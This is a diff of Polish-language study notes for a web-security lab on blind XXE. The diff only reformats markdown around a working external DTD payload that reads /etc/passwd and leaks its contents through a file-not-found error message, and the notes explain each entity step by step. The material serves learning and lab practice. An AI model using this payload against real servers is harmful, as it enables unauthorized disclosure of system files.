@@ -36,12 +36,12 @@ Jak to działa (chyba)?
 
 ## Lab: Exploiting blind XXE to retrieve data via error messages
 1. na naszym serwerze tworzymyh payload:
-### 
+``` 
 	<!ENTITY % file SYSTEM "file:///etc/passwd">
 	<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 	%eval;
 	%error;
-	
+```	
 - tworzy on referencję do zmiennej (% file), do której załadowujemy zawartość /etc/passwd
 - tworzy referencję do zmiennej (% eval), która dynamicznie tworzy zapytanie do nieistniejącego pliku (którego nazwą jest zawartość pliku /etc/passwd)
 - w "podmiocie" (entity) stworzonym przez wywołanie %eval; tworzymy referencję do zmiennej (%error), która zwróci błąd ponieważ ścieżka nie istnieje
